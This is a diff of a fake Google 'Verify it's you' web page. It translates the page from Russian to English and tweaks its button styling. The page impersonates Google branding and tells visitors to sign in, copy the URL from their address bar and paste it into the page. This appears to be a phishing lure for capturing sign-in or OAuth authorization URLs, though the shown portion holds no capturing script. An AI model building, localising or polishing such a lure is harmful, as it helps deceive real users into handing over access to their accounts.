@@ -27,7 +27,6 @@
             text-align: center;
         }
 
-        /* Логотип Google */
         .logo {
             margin-bottom: 20px;
         }
@@ -52,7 +51,6 @@
             font-weight: 400;
         }
 
-        /* Инструкции */
         .instructions {
             text-align: left;
             margin-bottom: 32px;
@@ -85,7 +83,7 @@
             font-weight: 500;
         }
 
-        /* Кнопка Sign in with Google — белая с тенью */
+        /* Белая кнопка Sign in with Google */
         .googleLoginBtn {
             display: flex;
             align-items: center;
@@ -105,12 +103,13 @@
             letter-spacing: 0.25px;
             user-select: none;
             box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
+            /* Убираем outline при фокусе */
+            outline: none;
         }
 
         .googleLoginBtn:hover {
             background: #f8f9fa;
             box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12);
-            border-color: #dadce0;
         }
 
         .googleLoginBtn:active {
@@ -118,7 +117,12 @@
             box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
         }
 
-        /* Иконка Google внутри кнопки (цветная) */
+        /* Убираем синюю обводку при фокусе */
+        .googleLoginBtn:focus-visible {
+            outline: 2px solid #1a73e8;
+            outline-offset: 2px;
+        }
+
         .googleLoginBtn .google-icon {
             display: inline-block;
             width: 20px;
@@ -132,14 +136,12 @@
             display: block;
         }
 
-        /* Язык */
         .lang {
             margin-top: 32px;
             font-size: 13px;
             color: #5f6368;
         }
 
-        /* Футер */
         .footer {
             margin-top: 16px;
             display: flex;
@@ -171,29 +173,28 @@
             </svg>
         </div>
 
-        <h1>Подтвердите, что это вы</h1>
+        <h1>Verify it's you</h1>
         <p class="subtitle">
-            Чтобы обеспечить безопасность вашего аккаунта,<br>
-            Google необходимо подтвердить, что это вы.<br>
-            Следуйте инструкциям.
+            To help keep your account secure, Google needs to verify it's you.<br>
+            Please follow the instructions.
         </p>
 
         <div class="instructions">
             <div class="step">
                 <span class="step-number">1</span>
-                <span class="step-text"><strong>Войдите</strong> в свой аккаунт Google.</span>
+                <span class="step-text"><strong>Sign in</strong> to your Google Account.</span>
             </div>
             <div class="step">
                 <span class="step-number">2</span>
-                <span class="step-text"><strong>Скопируйте</strong> URL-адрес из адресной строки.</span>
+                <span class="step-text"><strong>Copy</strong> the URL from the address bar.</span>
             </div>
             <div class="step">
                 <span class="step-number">3</span>
-                <span class="step-text"><strong>Нажмите «Вставить URL»</strong> и подтвердите вставку.</span>
+                <span class="step-text"><strong>Click Paste URL</strong> and confirm paste.</span>
             </div>
         </div>
 
-        <!-- Одна большая белая кнопка Sign in with Google -->
+        <!-- Только одна кнопка — Sign in with Google (белая) -->
         <div class="googleLoginBtn">
             <span class="google-icon">
                 <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
@@ -206,12 +207,12 @@
             Sign in with Google
         </div>
 
-        <div class="lang">Русский</div>
+        <div class="lang">English</div>
 
         <div class="footer">
-            <a href="#">Справка</a>
-            <a href="#">Конфиденциальность</a>
-            <a href="#">Условия</a>
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
         </div>
     </div>
 
